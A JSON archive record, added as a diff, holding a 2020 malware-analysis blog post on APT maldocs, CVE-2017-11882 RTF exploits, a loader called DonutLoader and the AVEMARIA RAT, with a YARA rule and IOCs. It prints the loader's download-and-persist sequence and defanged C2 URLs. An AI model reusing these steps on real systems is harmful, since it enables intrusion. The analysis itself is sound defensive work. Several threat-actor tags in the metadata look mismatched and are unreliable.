@@ -1,0 +1,234 @@
+{
+    "id": "abbf7b4b-4043-4f55-9c91-ba684be8fda1",
+    "created_at": "2023-01-12T15:05:26.139437Z",
+    "updated_at": "2025-03-27T02:12:33.090084Z",
+    "deleted_at": null,
+    "sha1_hash": "774aeb95bc0fc68b708915a628ac863ca0843062",
+    "title": "2020-11-30 - Do you want to bake a donut- Come on, let’s go update~ Go away, Maria.",
+    "authors": "",
+    "file_creation_date": "2022-05-27T19:01:58Z",
+    "file_modification_date": "2022-05-27T19:01:58Z",
+    "file_size": 133012,
+    "plain_text": "# Do you want to bake a donut? Come on, let’s go update~ Go away, Maria.\n\n**[medium.com/insomniacs/do-you-want-to-bake-a-donut-come-on-lets-go-update-go-away-maria-e8e2b33683b1](https://medium.com/insomniacs/do-you-want-to-bake-a-donut-come-on-lets-go-update-go-away-maria-e8e2b33683b1)**\n\nasuna amawaka November 30, 2020\n\nasu\nna\n\n[asuna amawaka](https://medium.com/@asuna.amawaka?source=post_page-----e8e2b33683b1--------------------------------)\n\nNov 30, 2020\n\n\n12 min read\n\nI have not done any proper analysis for a while now, so here I am, trying to keep my itchy fingers busy after\ngetting revved up by FlareOn last month.\n\nI saw this interesting post [1] and jumped right into it.\n\nPreliminary research got me these:\n\n\n-----\n\nI found additional samples on VirusTotal using RTF creation date: 2019:12:26 11:48:00\n\n\n-----\n\nThese samples are related to the same threat actor because of the overlapping C2 domains used, the\nsimilarities in file naming and the same payload deployed.\n\nAfter pivoting and researching, “Donot” and “Confucius” are two APT names that are closely related to the\nsamples found. I don’t have enough data on my hands to say if these two groups are the same or if they are\nsimply sharing infrastructure. Nonetheless, I shall concentrate on technical analysis while folks with more\ntelemetry can worry about attribution.\n\nThe maldocs deployed by the actor use the following techniques to initiate the infection: Template injection,\nmacros and/or exploits (e.g. CVE-2017–11882). After going through some trouble of\ndeobfuscation/decoding/decrypting strings and code, the final payload (AVEMARIA, aka WARZONE RAT) is\nfetched and executed using one of two ways. One is via a loader (comes in a pair of files made up of a DLL\nand a XOR-encrypted data file), which I named as DonutLoader since there is no existing catchy names for\nthis; the other way is via a different pair of files made up of a shellcode and a gif.\n\nThis long post shall be organized in this manner:\n\nTemplate injection\n\n\n-----\n\nMalicious RTFs (walkthrough of my analysis of the shellcode deployed by the exploits) to execute\nDonutLoader and/or AVEMARIA\nMacros to execute DonutLoader\nDonutLoader Analysis\nBrief comment on AVEMARIA\n\n**Template Injection**\n\nIn the case of “Suparco Vacancy Notification.docx”, the next stage malicious RTF is downloaded via\nrelationship templates.\n\nThe exact same settings.xml.rels file is observed within “Testing.docx”.\n\n“mal testin.docx” contains a different download link:\n\n\n-----\n\n**Malicious RTFs and the shellcode within**\n\n_RTF: 8E85C62E5D7FA9A6D2E176BCA6F6526B53EBFDA6EF3DF208E1E60434BD26EFFC_\n\nThe file “IN4447832” is a malicious RTF that downloads a pair of gif/shellcode files that in turns download the\nfinal payload. The whole series of activities is triggered with the exploitation of CVE-2017–11882. Let’s see\nhow it’s done.\n\nAt the end of the RTF file, we can see an embedded object:\n\n\n-----\n\nExtract this object and look at it again:\n\n\n-----\n\nThere it is, an exploit for the equation editor. We can find the beginning of the exploit shellcode after\nidentifying the “Font record” header (0x8 denotes Font record). Put it into IDA:\n\n\n-----\n\nWe can follow where the instructor pointer goes to within a debugger. Gflags come in handy again for this.\nSet the debugger for “eqnedt32.exe” to “C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\cdb -server\ntcp:port=5505”, click Apply and OK.\n\n\n-----\n\nExecute the RTF file and with windbg, connect to remote session “tcp:port=5505,server=localhost”.\n\nPut a breakpoint “ba r4 0x45BD3C” (taken from the shellcode 0x1271EB44 XOR 0x12345678) which will\nbreak on access read/write on the address.\n\nWhen the breakpoint hits, we see this:\n\n\n-----\n\nThe shellcode followed the addresses three times, let’s do the same and arrive at:\n\n\n-----\n\nThat looks like the MTEF data followed by font record, isn t it? The shellcode then jumps to offset 0x43 from\nhere, 0x5da358 + 0x43 = 0x5DA39B.\n\nNow, you know what to do. Put a breakpoint here of course.\n\n- bp 0x5DA39B\n\n\n-----\n\nThe shellcode then did a little “polymorphism” and we find out that deobfuscation is done on the last 0x315\nbytes of the extracted object — first a NOT, followed by XOR 0xE0.\n\n\n-----\n\nAfter deobfuscation, we can then see the strings and code:\n\n\n-----\n\nAnalyzing the deobfuscated code will lead us to know that the file “updte” is another shellcode that executes\ncode (again, XOR encrypted) in sant.gif.\n\n\n-----\n\n-----\n\nThe decryption within updte goes like this:\n\n\n-----\n\nWhich leads to me writing this little piece of python script to assist in decrypting the gif file:\n\n\n-----\n\nAfter decryption, the data looks like the following. But somehow, some parts of it looks like they are still\nobfuscated…\n\n\n-----\n\nWell, IDA confirms our suspicions.\n\n\n-----\n\nEasy!\n\n\n-----\n\n_RTF: 686847B331ACE1B93B48528BA50507CBF0F9B59AEF5B5F539A7D6F2246135424_\n\nThe file “KB466432” is also a malicious RTF that executes a loader via exploitation of eqnedt32. This is\ndifferent from the above RTF I analyzed.\n\n\n-----\n\nA cursory look at the RTF reveals an embedded object like this:\n\n\n-----\n\nWhich turns out to be a PE named “muka.dll”. Take note of the path\n“C:\\Users\\Dev\\Desktop\\07082020_8570_S\\”\n\n\n-----\n\nThen there is also this other embedded object. Notice how there is a very long NOP sled within, which hints\nto us that this object is some code (probably the exploit):\n\n\n-----\n\nIndeed, when we inspect this object, there’s a suspicious “tion.3” string in there, which reminds us of\n“Equation.3”. Very likely, we are looking at a CVE-2017–11882 or CVE-2018–0802 exploit again. Let’s see\nwhat the exploit tries to do. We can find the beginning of the exploit shellcode after identifying the “Font\nrecord” header.\n\n\n-----\n\nIn the earlier RTF analysis, we found an address that leads to where the MTEF data is found. Maybe use it\nagain here:\n\n- ba r4 0x45BD3C\n\nBingo!\n\n\n-----\n\nPut a breakpoint on where the shellcode begins (in this case, 0x618efa). But it didn’t get hit. Maybe it got\ncopied somewhere else before getting executed? Try\n\n- ba r1 0x618efa\n\nLooks like we are right!\n\n\n-----\n\n- bp 0x18f318\n\n\n-----\n\nNotice that the shellcode is seeking an address 2*0x7F starting from the MTEF header (0x5B8F0 + 0x7F +\n0x7F), push this address to the stack, and then return to this address.\n\n\n-----\n\nTaking a quick look at the shellcode in IDA, seems that the shellcode is trying to load muka.dll.\n\n\n-----\n\nConfirm this with the debugger. The shellcode calls the export “zenu” of muka.dll.\n\n\n-----\n\nIt turns out that muka.dll is a DonutLoader. I’ll get to its analysis in awhile.\n\n**Macros and DonutLoader**\n\nDonutLoader can also be embedded within the maldoc and executed via macro.\n\n\n-----\n\nmacro\n\n\n-----\n\nembedded object 1 filename\n\n\n-----\n\nembedded object 2 filename\nWithin 1d9ede11b34a20d4947f01432cea088dbefa911f02afaae9095673f56a76eafa, there are 2 embedded\nobjects (as shown in screen captures above):\n\n- C:\\Users\\Dev\\AppData\\Local\\Temp\\written.dll\n\n- C:\\Users\\Dev\\AppData\\Local\\Temp\\s\n\nNote also the paths “C:\\Users\\Dev\\Desktop\\Macro_Xls_1704_S” and\n“C:\\Users\\Dev\\Desktop\\01052020_MacroXlsEmb_S” which will help us to find more samples.\n\nWritten.dll is a PE in plain, while s is a 0x98-XORed PE.\n\n\n-----\n\nembedded object 1: written.dll\n\n\n-----\n\nembedded object 2: s\nThese files are DonutLoaders. OK, coming up next is their analysis finally!\n\n**DonutLoader**\n\nThe name came about because I repeatedly mistyped the group name “Donot” as “Donut” when writing notes\nabout these samples. Folks at PTSecurity [2] did analysis on some similar samples and called them “Lo2\nloaders”.\n\nFrom the RTFs I found from VirusTotal, most of them have a pair of files embedded — a DLL and a XORencoded data file. The following collates all the DonutLoader samples that I looked at.\n\n\n-----\n\nThe DLL binaries make use of base64 and XOR operations to obfuscate its configuration data/strings so that\nour lives become a little bit harder.\n\nI was able to decode strings from these binaries with the help of a small python script:\n\n\n-----\n\nThis python script does the same thing as the one found in PT Security’s article, which said that this\nalgorithm has been in use since October 2019.\n\n\n-----\n\nThere is one binary that is “odd”. It had the latest compilation datetime amongst the files I looked at (which\nwere compiled around Jun/Jul 2020). It uses a different algorithm to decode the strings.\n\n\n-----\n\n-----\n\nFrom within the DLL, the XOR-encoded file is read, decoded and executed.\n\n\n-----\n\nWithin this second XOR-encoded executable, the same tricks are used to obfuscate strings from our prying\neyes, consisting of base64 and XOR encoding, as well as byte additions. Interestingly, not all the strings can\nbe decoded. But from what could be decoded, we can see where the next stage malware is downloaded\nfrom.\n\n\n-----\n\nmuka.dll (SHA256: 1C41A03C65108E0D965B250DC9B3388A267909DF9F36C3FEFFFBD26D512A2126)\n\n(This file came from the RTF “KB466432”, SHA256:\n_686847B331ACE1B93B48528BA50507CBF0F9B59AEF5B5F539A7D6F2246135424, analyzed above)_\n\nThis particular DonutLoader is more straightforward that those that occur in a pair. It uses just one type of\nstring obfuscation:\n\n\n-----\n\nA quick look at the deobfuscated strings:\n\n\n-----\n\nAt runtime, the strings are used in the following manner:\n\nCreateDirectoryA(“C:/intel”, ..)\nURLDownloadToFileA(…, “hxxp://wordupdate.com/recent/update”, “C:/intel/new.exe”, …)\nPersistence is established with a shortcut to execute new.exe at startup:\n“C:/Users/user/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/new.lnk”\n\n**AVEMARIA**\n\nThe final payload malware is in fact WARZONE RAT (researchers named it AVEMARIA because of this string\nfound within earlier versions of the RAT). Many folks have done analysis on this RAT so I’m not going to go\ninto deepdive.\n\nSome findings that I found interesting regarding the AVEMARIAs executed by DonutLoader:\n\nThe PDB path is intentionally misleading. That path “VCSamplesmaster\\VC2010Samples\\ATL\\General\\ATLCollections\\Client” is identical to Microsoft’s “VCSample”\nproject on Github and the executable has nothing to do with what the path describes. I found lots of\nother AVEMARIAs based on PDBs like this. This could be part of the builder/encrypter in the\nWARZONE suite.\n\n\n-----\n\n-----\n\nMicrosoft’s VCSamples project on Github\n\nThe actual AVEMARIA payload (the one that calls back to the C2) is decoded and executed in memory\nand I dumped it to look at the strings. The keyword “warzone160” can be found, and this dumped\nexecutable matches YARA rules describing AVEMARIA.\n\n\n-----\n\nMany more similar AVEMARIAs calling back to the same C2 can be found on VirusTotal, with relations\nto the known domain names used by the maldocs/DonutLoaders. Looks like AVEMARIA is a tool of\nchoice to this APT group.\n\n**Last words**\n\nAnalyzing this set of malicious docs and executables has been fun, I’ll just leave you all with a set of IOCs\nand YARA rule for detecting DonutLoader. If anyone is interested to discuss, DM me on Twitter!\n\n\n-----\n\nimport pe\n\nrule MAL_DonutLoader_DonotAPT {\n\nmeta:\nauthor = “Asuna Amawaka”\ndescription = “This rule hopes to capture parents of DonutLoader as well as DonutLoader binaries”\ndate = “30 Nov 2020”\n\nstrings:\n$filename1 = “wavs.bin” wide ascii nocase\n$filename2 = “ogg.bin” wide ascii nocase\n$filename3 = “muka.dll” wide ascii nocase\n$filename4 = “linknew.dll” wide ascii nocase\n$filename5 = “kpryt.dll” wide ascii nocase\n$filename6 = “cvent.dll” wide ascii nocase\n$filename7 = “trui19o2.dll” wide ascii nocase\n$filename8 = “lioj86.dll” wide ascii nocase\n$filename9 = “fuitel.dll” wide ascii nocase\n$filename10 = “dpur.dll” wide ascii nocase\n$filename11 = “mecru.dll” wide ascii nocase\n$filename12 = “eupol.dll” wide ascii nocase\n$filename13 = “mentn.dll” wide ascii nocase\n$filename14 = “made.dll” wide ascii nocase\n$filename15 = “notr.dll” wide ascii nocase\n$filename16 = “vetu.dll” wide ascii nocase\n$filename17 = “detr.dll” wide ascii nocase\n$filename18 = “bese.dll” wide ascii nocase\n$filename19 = “NumberAlgo.dll” wide ascii nocase\n$filename20 = “JacaPM.dll” wide ascii nocase\n$filename21 = “maroork.dll” wide ascii nocase\n$filename22 = “fli0.dll” wide ascii nocase\n$filename23 = “nuityr.dll” wide ascii nocase\n$filename24 = “jgasf.dll” wide ascii nocase\n$filename25 = “tuyrt.dll” wide ascii nocase\n$filename26 = “lefbu.dll” wide ascii nocase\n$filename27 = “pult.dll” wide ascii nocase\n$filename28 = “quep.dll” wide ascii nocase\n$filename29 = “nmwell.dll” wide ascii nocase\n$filename30 = “yello.dll” wide ascii nocase\n$filename31 = “lokr.js” wide ascii nocase\n$filename32 = “falin.js” wide ascii nocase\n$filename33 = “obile.js” wide ascii nocase\n$filename34 = “vqiw.js” wide ascii nocase\n$filename35 = “gb.bat” wide ascii nocase\n$filename36 = “iksm.bat” wide ascii nocase\n$filename37 = “trrt.bat” wide ascii nocase\n$filename38 = “blo.bat” wide ascii nocase\n$filename39 = “SystemService.exe” wide ascii nocase\n\n\n-----\n\n$path1 = C:\\\\Users\\\\Dev\\\\Desktop\\\\07082020_8570_S\\\\ wide ascii nocase\n$path1_wild = {5c 55 73 65 72 73 5c 44 65 76 5c 44 65 73 6b 74 6f 70 5c [8] 5f [4] 5f 53 5c}\n$path2 = “AppData\\\\Roaming\\\\EvMGR” wide ascii nocase\n$path3 = “C:\\\\Users\\\\Dev\\\\Desktop\\\\Macro_Xls_1704_S” wide ascii nocase\n$path3_wild = {5c 55 73 65 72 73 5c 44 65 76 5c 44 65 73 6b 74 6f 70 5c 4d 61 63 72 6f 5f 58 6c 73 5f\n\n[4] 5f 53}\n$path4 = “C:\\\\Users\\\\Dev\\\\Desktop\\\\01052020_MacroXlsEmb_S” wide ascii nocase\n$path4_wild = {5c 55 73 65 72 73 5c 44 65 76 5c 44 65 73 6b 74 6f 70 5c [8] 5f 4d 61 63 72 6f 58 6c\n73 45 6d 62 5f 53}\n\n$str1 = “MJuego” wide ascii nocase\n$str2 = “0007E9E4CE4D” wide ascii nocase\n$str3 = “Bensun” wide ascii nocase\n$str4 = “Menner” wide ascii nocase\n\n$pdbpath1 =\n“Soft\\\\DevelopedCode_Last\\\\BitDefenderTest\\\\m0\\\\New_Single_File\\\\Lo2\\\\SingleV2\\\\Release\\\\BinWork.pdb”\nwide ascii nocase\n$pdbpath1_wild = {5c 53 6f 66 74 5c 44 65 76 65 6c 6f 70 65 64 43 6f 64 65 5f 4c 61 73 74 5c 42 69\n74 44 65 66 65 6e 64 65 72 54 65 73 74}\n$pdbpath2 = “Users\\\\admin\\\\Documents\\\\dll\\\\linknew\\\\Release\\\\linknew.pdb” wide ascii nocase\n\ncondition:\n\nuint16(0) == 0x5a4d and filesize < 600KB and ((1 of ($filename*)) or (any of ($path*, $str*, $pdbpath*))\nor pe.exports(“zenu”) or pe.exports(“flis”) or pe.exports(“jrgbeg”) or pe.exports(“csytu”) or\npe.exports(“neeu”) or pe.exports(“vile”))\n\n}\n\nwordupdate[.]com/recent/update\ncheaperlive[.]xyz/xolto/mikix\ntampotrust[.]top/tax/lodi/pkra\nremindme[.]top/tax/lodi/pkra\nrecent.wordupdate[.]com/ver/update12/KB466432\nthe-moondelight[.]96[.]lt/latest/updte\nthe-moondelight[.]96[.]lt/optra/sant.gif\nthe-moondelight[.]96[.]lt/latest/version/secure/download/IN4447832\nthe-moondelight[.]96[.]lt/windw-sec/append\n1C41A03C65108E0D965B250DC9B3388A267909DF9F36C3FEFFFBD26D512A2126\n8CFBFECFE475C3621277EE7F680E3A0CB9C650802363DAA256C1057ADFB817A9\n7A987295229D2514D99916D53F196B87758CE08FD8621CF68BC419DC99B80D6D\nD279DDB6B2A566BC24E789B5181663491B8C2818CB91E28AAE5721DCB0BF30B6\nAB04BF258CF71B4A1CB934491CF942ECDA0EC82D4F6A80B5108D7607BE6FC2BE\n7F4B7D0C6076E197A509C01C0794EBC450229FF5D555BE8D7F89F98B3C43A298\n684F68429F8BAC224E6FDC68195C89B54BA469FBCC2184EC2B5FC689E585CA54\n0EA05331E775DE6B329FF1FA22F11809C2C1BCB6E17683552219CB32F52A47F5\n83847C527F713B6E13849028D66B08686ADDE26B8E9ECD8DDC78AD178EF7BDCB\nE291A146F79D927D18392A04D238D829C0DF156410E4D93636AEE1B5663DB914\nE6753EB498F58F95C8FC931B6CD53647CE2F4F8F7AD4274C22CA2B6284FB5308\n67C0C937E049083193649449519A57E42945CA2ABE19756F4E76D95CAA44A062\n\n\n-----\n\n70D41C8C25CB8E75296576D3DBB37720E03F96691691763953FEA0FE00F50EB4\n9B34F53DDC20D5EA2F7B47818ED2E7D626948256268CB4E2B11E47ECAF9A839A\n891ACF7B729183945F209C915BA2BB57B541E2EA350899A541DB9A63428711A5\nFB46324757D0EC8B0AC02729E281E47EF1C367DEED483F14481441C2F9B6CA34\n66F3134E3E040F50ED59629379C0750D896969ACFDC55105BE7FEF81839BA035\n1C4B8A1F48FF1B9511AEC0704983E45242F01C2109AB4602F7952481429DDC84\n88672DF33B02275660EC3995F3BAD63FE994C09BA8E978E7F18D4F8C9A97637A\n7609034E7473869B3A5767F9543B6067998F4DB68E3BA26966C115535337337F\nADE6D291C870A9F59D4A22FF4D61E6B2A913538701517E8D0AA275855FD80A76\nE99AE9163F6DBBA22E1357C2164EB0F9971A264A481813EC11DC598784435B95\n1E6E568E2FCCFEB2E0275982D5637E0BE6D0BA4575685126D957061BF2D19678\n4C5C43F4932AC497C716BB5EC30A7636E5056775A4D5F3F48B9E5C1414B9F7B3\n7305E08AB7812F44EA42E89AE7D473B1F373C151CA8D12F77B79E85C942366FC\n59CCFFF73BDB8567E7673A57B73F86FC082B0E4EEAA3FAF7E92875C35BF4F62C\nA3CD781B14D75DE94E5263CE37A572CDF5FE5013EC85FF8DAEEE3783FF95B073\n904E966DA7B38514F6AC23BBA1DAC1858888CD48FA77B73C770156B19A88A4C8\n8E85C62E5D7FA9A6D2E176BCA6F6526B53EBFDA6EF3DF208E1E60434BD26EFFC\n5C9477C16DF8EF4434C042E69B473A44452CAEE96219A56EB2DA30F0B5E85976\n686847B331ACE1B93B48528BA50507CBF0F9B59AEF5B5F539A7D6F2246135424\n1D9EDE11B34A20D4947F01432CEA088DBEFA911F02AFAAE9095673F56A76EAFA\n\nReferences:\n\n[1] [https://twitter.com/RedDrip7/status/1324205510380322816?s=20](https://twitter.com/RedDrip7/status/1324205510380322816?s=20)\n\n[2] “Studying Donot Team”, 28 May 2020 https://www.ptsecurity.com/ww-en/analytics/pt-esc-threatintelligence/studying-donot-team/\n\n~Asuna~\n\n[https://twitter.com/AsunaAmawaka](https://twitter.com/AsunaAmawaka)\n\nDrop me a DM if you would like to share findings or samples ;)\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-11-30 - Do you want to bake a donut- Come on, let’s go update~ Go away, Maria..pdf"
+    ],
+    "report_names": [
+        "2020-11-30 - Do you want to bake a donut- Come on, let’s go update~ Go away, Maria..pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "b740943a-da51-4133-855b-df29822531ea",
+            "created_at": "2022-10-25T15:50:23.604126Z",
+            "updated_at": "2025-03-27T02:00:55.505366Z",
+            "deleted_at": null,
+            "main_name": "Equation",
+            "aliases": [
+                "Equation"
+            ],
+            "source_name": "MITRE:Equation",
+            "tools": null,
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "caf95a6f-2705-4293-9ee1-6b7ed9d9eb4c",
+            "created_at": "2022-10-25T15:50:23.472432Z",
+            "updated_at": "2025-03-27T02:00:55.479021Z",
+            "deleted_at": null,
+            "main_name": "Confucius",
+            "aliases": [
+                "Confucius",
+                "Confucius APT"
+            ],
+            "source_name": "MITRE:Confucius",
+            "tools": [
+                "WarzoneRAT"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        },
+        {
+            "id": "2ac63ef4-a7b8-4a30-96ad-b30ccb2073fc",
+            "created_at": "2022-10-25T16:07:23.546262Z",
+            "updated_at": "2025-03-27T02:02:09.856624Z",
+            "deleted_at": null,
+            "main_name": "Donot Team",
+            "aliases": [
+                "APT-C-35",
+                "SectorE02"
+            ],
+            "source_name": "ETDA:Donot Team",
+            "tools": [
+                "BackConfig",
+                "EHDevel",
+                "Jaca",
+                "yty"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
+            "created_at": "2022-10-25T16:07:23.773944Z",
+            "updated_at": "2025-03-27T02:02:09.974695Z",
+            "deleted_at": null,
+            "main_name": "Lead",
+            "aliases": [
+                "Casper",
+                "TG-3279"
+            ],
+            "source_name": "ETDA:Lead",
+            "tools": [
+                "Agentemis",
+                "BleDoor",
+                "Cobalt Strike",
+                "CobaltStrike",
+                "RbDoor",
+                "RibDoor",
+                "Winnti",
+                "cobeacon"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "cfdd350b-de30-4d29-bbee-28159f26c8c2",
+            "created_at": "2023-01-06T13:46:38.433736Z",
+            "updated_at": "2025-03-27T02:00:02.832565Z",
+            "deleted_at": null,
+            "main_name": "VICEROY TIGER",
+            "aliases": [
+                "OPERATION HANGOVER",
+                "Donot Team",
+                "APT-C-35",
+                "SectorE02",
+                "Orange Kala"
+            ],
+            "source_name": "MISPGALAXY:VICEROY TIGER",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "7a8dbc5e-51a8-437a-8540-7dcb1cc110b8",
+            "created_at": "2022-10-25T16:07:23.482856Z",
+            "updated_at": "2025-03-27T02:02:09.827887Z",
+            "deleted_at": null,
+            "main_name": "Confucius",
+            "aliases": [],
+            "source_name": "ETDA:Confucius",
+            "tools": [
+                "ApacheStealer",
+                "ByeByeShell",
+                "ChatSpy",
+                "Confucius",
+                "MY24",
+                "Sneepy",
+                "remote-access-c3",
+                "sctrls",
+                "sip_telephone",
+                "swissknife2"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "9041c438-4bc0-4863-b89c-a32bba33903c",
+            "created_at": "2023-01-06T13:46:38.232751Z",
+            "updated_at": "2025-03-27T02:00:02.778714Z",
+            "deleted_at": null,
+            "main_name": "Nitro",
+            "aliases": [
+                "Covert Grove"
+            ],
+            "source_name": "MISPGALAXY:Nitro",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "a2b44a04-a080-4465-973d-976ce53777de",
+            "created_at": "2022-10-25T16:07:23.911791Z",
+            "updated_at": "2025-03-27T02:02:10.025108Z",
+            "deleted_at": null,
+            "main_name": "Nitro",
+            "aliases": [
+                "Covert Grove",
+                "Nitro"
+            ],
+            "source_name": "ETDA:Nitro",
+            "tools": [
+                "AngryRebel",
+                "Backdoor.Apocalipto",
+                "Chymine",
+                "Darkmoon",
+                "Farfli",
+                "Gen:Trojan.Heur.PT",
+                "Gh0st RAT",
+                "Ghost RAT",
+                "Moudour",
+                "Mydoor",
+                "PCClient",
+                "PCRat",
+                "Poison Ivy",
+                "SPIVY",
+                "Spindest",
+                "pivy",
+                "poisonivy"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "9c884c88-2c9f-49c5-856a-2383ad1d8ef8",
+            "created_at": "2024-05-01T02:03:08.152Z",
+            "updated_at": "2025-03-27T02:05:17.422887Z",
+            "deleted_at": null,
+            "main_name": "ZINC EMERSON",
+            "aliases": [
+                "Dropping Elephant ",
+                "EHDevel ",
+                "Manul ",
+                "Monsoon ",
+                "Operation Hangover ",
+                "Patchwork ",
+                "TG-4410 ",
+                "Viceroy Tiger ",
+                "Confucius "
+            ],
+            "source_name": "Secureworks:ZINC EMERSON",
+            "tools": [
+                " Hanove",
+                " Mac OS X KitM Spyware",
+                " Proyecto2",
+                " YTY Backdoor",
+                "Enlighten Infostealer"
+            ],
+            "source_id": "Secureworks",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535926,
+    "ts_updated_at": 1743041553,
+    "ts_creation_date": 1653678118,
+    "ts_modification_date": 1653678118,
+    "files": {
+        "pdf": "https://archive.orkl.eu/774aeb95bc0fc68b708915a628ac863ca0843062.pdf",
+        "text": "https://archive.orkl.eu/774aeb95bc0fc68b708915a628ac863ca0843062.txt",
+        "img": "https://archive.orkl.eu/774aeb95bc0fc68b708915a628ac863ca0843062.jpg"
+    }
+}
